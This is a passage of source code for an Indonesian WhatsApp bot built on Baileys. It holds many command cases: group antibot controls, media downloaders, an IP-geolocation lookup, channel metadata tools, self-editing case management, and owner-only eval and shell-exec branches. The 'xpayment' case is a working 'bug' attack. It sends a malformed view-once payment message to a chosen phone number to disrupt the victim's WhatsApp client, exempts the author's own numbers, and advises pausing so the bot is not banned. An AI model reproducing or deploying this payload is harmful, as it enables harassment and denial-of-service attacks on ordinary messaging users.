conn.relayMessage(m.chat, {requestPaymentMessage: {currencyCodeIso4217: 'IDR', amount1000: 10000000, requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: teks, contextInfo: { externalAdReply: { showAdAttribution: true}}}}}}, {})
}}
break

case 'antibot': {

if (!isCreator) return reply(mess.owner)
 if (!m.isGroup) return reply(mess.group)
if (args[0] === "on") {
if (antibot) return reply('Sukses Mengaktifikan Tuan✅')
antibott.push(from)
fs.writeFileSync('./database/antibot.json', JSON.stringify(antibott))
reply('Success in turning on antibot in this group')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTolong jika ada bot ada disini mohon di self atau mute jika ada bot maka antibot akan kena kick`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antibot) return reply('Sukses Menonaktifkan Tuan✅')
let off = antibott.indexOf(from)
antibott.splice(off, 1)
fs.writeFileSync('./database/antibot.json', JSON.stringify(antibott))
reply('Success in turning off antibot in this group')
} else {
 await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
 }
 }
 break


case 'mahasiswa':{
if (!text) return reply(`Example ${prefix + command}`)
reply('Sedang mencari Orangnya... Silahkan tunggu');
 let res = await fetch('https://api-frontend.kemdikbud.go.id/hit_mhs/' + text);
 if (!res.ok) return reply('Tidak Ditemukan');
 let json = await res.json();
 let message = '';

 json.mahasiswa.forEach(data => {
 let nama = data.text;
 let websiteLink = data['website-link'];
 let website = `https://pddikti.kemdikbud.go.id${websiteLink}`;
 message += `\nNama = ${nama}\n\nData Ditemukan pada website = ${website}\n\n\n`;
 });
 reply(message);
}
break

case 'videy' : {
if (!args[0]) {
 return m.reply(`• Contoh: ${prefix + command} https://videy.co/v?id=K7wdQnbm`);
}
async function videy(url) {
return new Promise(async (resolve, reject) => {
try {
const res = await axios(`${url}`, { method: 'get' });
const $ = cheerio.load(res.data);
const video = $('source[type="video/mp4"]').attr('src');
if (video) {
resolve(video);
} else {
throw new Error('Video source not found');
}
} catch (error) {
reject(`Error while fetching the URL: ${error.message}`);
h}
});
}
if (!/^http(s):\/\/videy\.co/i.test(args[0])) {
 return m.reply('Link Invalid');
}

try {
 let result = await videy(args[0]);
 await conn.sendMessage(m.chat, { video: { url: result }, caption: "Done" }, { quoted: m });
} catch (error) {
 console.log(error);
 throw new Error(error);
}
}
break

case "addpremd":{
if (!isCreator) return reply(mess.owner)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return reply(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return reply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
} else {
var cekap = await conn.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
}}
break

case "ttv": {
if (!q) return reply(` Contoh :${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid`)
reply(mess.wait)
const data = await dylux.tiktok(text)
const json = data.result
conn.sendMessage(m.chat, { video: { url: json.play }, caption: `title: ${json.title}` }, { quoted:m })
}
break


case 'xpayment': {
					if (!isCreator) return m.reply('Fitur Khusus Member Premium')
if (!text) return m.reply(`Usage .${command} 916909137213`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return m.reply(`Example : ${prefix+command} 916909137213`)
var contactInfo = await conn.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
 let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
 if (cleanedNumber == "6285224079032") {
 return;
 }
 if (cleanedNumber == "6287826292008") {
 return;
 }
 if (cleanedNumber == "62895375577040") {
 return;
 }
 if (contactInfo.length == 0) {
 return m.reply("The number is not registered on WhatsApp");
 }
reply(mess.bugrespon)
 async function xeonBugPay(jid){
				await conn.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				await xeonBugPay(whatsappNumber);
 sendMessageWithMentions(
 "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
 " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
 [whatsappNumber]
 );
reply('`Sukses To Send Bug For target`')
				}
				break

case 'trackip':
{
if (!text) return m.reply(`*Example:* ${prefix + command} 112.90.150.204`);
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
 
if (!res.success) throw new Error(`IP ${text} not found!`);
await conn.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
m.reply(formatIPInfo(res)); 
} catch (e) { 
m.reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break

/*[ CASE / SCRAPER ]

*Dev*: Tanaka Senn
*Saluran*: https://whatsapp.com/channel/0029VaW25g5F1YlKczMRmd1h
*Group*: https://chat.whatsapp.com/GPS1NTSBgYKGFXUodW5XcD
NOTE: Gunakan baileys yang support saluran seperti 
1. github:nstar-y/Bail
2. github:KyuuRzy/Bail
3. github:LT-SYAII/Bail
Ow iya join grup lek biar sigma

CODE*/
case 'inspectch':
case 'cidch': {
if (!isRegistered) return reply('kamu belum terverifikasi, silahkan regis terlebjh dahulu')
 if(!text) return m.reply(`Kirim perintah ${prefix + command} https://whatsapp.com/channel/xxxxxxxx`)
 if(!args[0] && !args[0].includes('whatsapp.com/channel')) return m.reply("link tidak valid")
 await conn.sendMessage(m.chat, {
 react: {
 text: "⏱️",
 key: m.key,
 }
 })

 function formatDate(timestamp) {
 const date = new Date(timestamp * 1000);
 const months = [
 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun',
 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'
 ];
 const day = date.getDate();
 const month = months[date.getMonth()];
 const year = date.getFullYear();
 return `${day} ${month} ${year}`;
 }
 try {
 let result = args[0].split('https://whatsapp.com/channel/')[1]
 let data = await conn.newsletterMetadata("invite", result)
 let teks = `*NEWSLETTER ID*

*Name:* ${data.name}
*ID*: ${data.id}
*Status*: ${data.state}
*Dibuat Pada*: ${formatDate(data.creation_time)}
*Subscribers*: ${data.subscribers}
*Meta Verify*: ${data.verification}
*React Emoji:* ${data.reaction_codes}
*Description*: ${readmore}
${data.description}
`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: teks
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ''
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "",
 hasMediaAttachment: false
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
{
 "name": "cta_copy",
 "buttonParamsJson":` {\"display_text\":\"Copy ID\",\"id\":\"123456789\",\"copy_code\":\"${data.id}\"}`
 },
 ],
 })
 })
 }
 }
}, { quoted : m})

await conn.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
 }
 catch (error) {
 m.reply("link tidak valid")
 }
}
break

case "chlist": {
 let id = Object.keys(db.data.chats).filter(a => a.endsWith("@newsletter"))
 let ar = []
 for (let i of id) {
 let meta = await conn.newsletterMetadata("jid", i)
 ar.push({
 subject: meta.name,
 id: meta.id,
 role: meta.viewer_metadata.role,
 followers: meta.subscribers.toLocaleString(),
 create: require("moment-timezone")(meta.creation_time * 1000).format("DD/MM/YYYY HH:mm:ss"),
 picture: meta.picture ? "https://pps.whatsapp.net" + meta.picture : "N/A",
 url: "https://whatsapp.com/channel/" + meta.invite
 })
 }
 let cap = `*– 乂 N E W S L E T T E R - L I S T*

${ar.map(a => Object.entries(a).map(([a, b]) => ` ◦ ${a} : ${b}`).join("\n")).join("\n\n")}


> Total Newsletter Chat : ${ar.length}`

 reply(cap)
 }
 break;
case 'addcase': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply('Mana case nya');
const fs = require('fs');
const namaFile = 'main.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return;
}
const posisiAwalGimage = data.indexOf("case 'addcase':");

if (posisiAwalGimage !== -1) {
const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
if (err) {
reply('Terjadi kesalahan saat menulis file:', err);
} else {
reply('Case baru berhasil ditambahkan.');
}
});
} else {
reply('Tidak dapat menambahkan case dalam file.');
}
});
}
break
        /*case 'delcase': {
if (!isCreator) return reply(mess.owner)
if (!q) return reply('*Masukan nama case yang akan di hapus*')
dellCase('./main.js', q)
reply('*Dellcase Successfully*')
}
break*/
        case 'delcase': {
if (!isCreator) return reply(mess.owner);
if (!q) return reply("Masukkan nama case yang ingin dihapus, contoh: delcase gpt4");

let caseName = q

let fileContent = fs.readFileSync("./main.js", "utf-8");

let startIndex = fileContent.indexOf(`case "${caseName}"`);
let endIndex = fileContent.indexOf("break", startIndex);

if (startIndex !== -1 && endIndex !== -1) {
let caseToDelete = fileContent.slice(startIndex, endIndex + 6);
fileContent = fileContent.replace(caseToDelete, "");

fs.writeFileSync("./main.js", fileContent, "utf-8");

reply(`Case "${caseName}" berhasil dihapus!`);
} else {
reply(`Tidak dapat menemukan case "${caseName}" untuk dihapus.`);
}
}
break
       case 'snack2': case 'snackvideo2':{
if (!text) return m.reply ('input, url') 
let res = snekVid(text);
let memek = `[ ${global.botname} is here ]`
conn.sendMessage(m.chat, { video: { url: res.video }, mimetype: 'video/mp4', fileName: `snack.mp4`, caption: memek })
}
break
//=================================================
default:
if (budy.startsWith('=>')) {
if (!isCreator) return m.reply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}

try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return m.reply('*khusus Premium*')
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
if (!isCreator) return m.reply('*khusus Premium*')
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.isBaileys) return
if (from.endsWith('broadcast')) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
conn.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (error) {
  // tangani kesalahan untuk semua case di sini
}
} catch (err) {
console.log(util.format(err))}}
//=================================================//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
